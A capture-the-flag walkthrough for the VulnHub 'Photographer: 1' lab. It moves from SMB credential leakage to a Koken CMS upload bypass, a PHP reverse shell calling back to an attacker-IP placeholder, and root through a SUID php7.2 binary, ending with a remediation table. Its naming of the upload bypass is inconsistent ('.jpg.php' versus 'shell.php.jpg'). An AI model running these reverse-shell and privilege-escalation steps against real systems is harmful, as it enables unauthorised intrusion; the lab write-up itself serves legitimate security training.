# Photographer: 1 — Writeup

| | |
|-|-|
| **Target IP** | 192.168.56.X (host-only) |
| **Difficulty** | Easy |
| **OS** | Linux (Ubuntu) |
| **Root Flag** | /root/proof.txt |
| **Source** | [VulnHub](https://www.vulnhub.com/entry/photographer-1,519/) |

## Attack Summary

nmap → SMB share email leaks Koken CMS credentials → admin panel → file upload bypass (.jpg.php) → reverse shell as www-data → SUID php7.2 → root

## Methodology

1. Network discovery and port scan
2. SMB enumeration — credentials in share
3. Koken CMS login and file upload bypass
4. Reverse shell and stable TTY
5. SUID enumeration and php7.2 privesc

---

## Step 1: Network Discovery

```bash
sudo netdiscover -i eth1 -r 192.168.56.0/24
```

Then full port scan:

```bash
nmap -sV -sC -p- 192.168.56.X
```

Expected open ports:
```
80/tcp   open  Apache httpd 2.4.18
139/tcp  open  Samba smbd 3.X-4.X
445/tcp  open  Samba smbd 4.3.11
8000/tcp open  Koken CMS (Apache/2.4.18)
```

---

## Step 2: SMB Enumeration

Enumerate shares and find readable content:

```bash
enum4linux -a 192.168.56.X
smbclient //192.168.56.X/daisa -N
```

Inside the share, retrieve the email:

```bash
smb: \> get mailsent.txt
```

The email reveals credentials: `daisa@photographer.com` / `babygirl`

---

## Step 3: Koken CMS Login

Browse to `http://192.168.56.X:8000/admin` and log in with the discovered credentials.

Navigate to **Content → Import** (or Library). Koken restricts uploads to image types, but the filter only checks the file extension in the browser.

Prepare a PHP reverse shell:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.php.jpg
# Edit: set $ip = your_attacker_ip, $port = 4444
```

Upload `shell.php.jpg` through Koken's import dialog. The file is stored on disk with its original name.

---

## Step 4: Reverse Shell

Start listener:

```bash
nc -lvnp 4444
```

Trigger the shell by accessing the uploaded file directly:

```bash
# Find the path through Koken storage:
http://192.168.56.X:8000/storage/originals/XX/XX/shell.php.jpg
```

Stabilize the TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

---

## Step 5: Privilege Escalation (SUID php7.2)

Search for SUID binaries:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Notable result: `/usr/bin/php7.2`

Exploit it:

```bash
php7.2 -r "pcntl_exec('/bin/bash', ['-p']);"
```

Or more directly:

```bash
/usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
```

Now running as root:

```bash
id
# uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root)
cat /root/proof.txt
```

---

## Lessons Learned

1. **SMB shares often leak credentials** — always enumerate with smbclient and enum4linux
2. **CMS file upload restrictions** are often client-side only; appending a valid extension (`.jpg.php`) bypasses them
3. **SUID binaries** with interpreter capabilities (php, python, ruby) are instant root privesc vectors
4. Default CMS installations with no hardening leave admin panels exposed on non-standard ports

## Remediation

| Vulnerability | Fix |
|---|---|
| Credentials in SMB share | Remove sensitive files from shares; use access controls |
| Koken file upload bypass | Validate MIME type server-side; restrict PHP execution in upload paths |
| SUID php7.2 | Remove the SUID bit: `chmod u-s /usr/bin/php7.2` |
| Koken on default port 8000 | Place behind reverse proxy with auth; firewall non-essential ports |
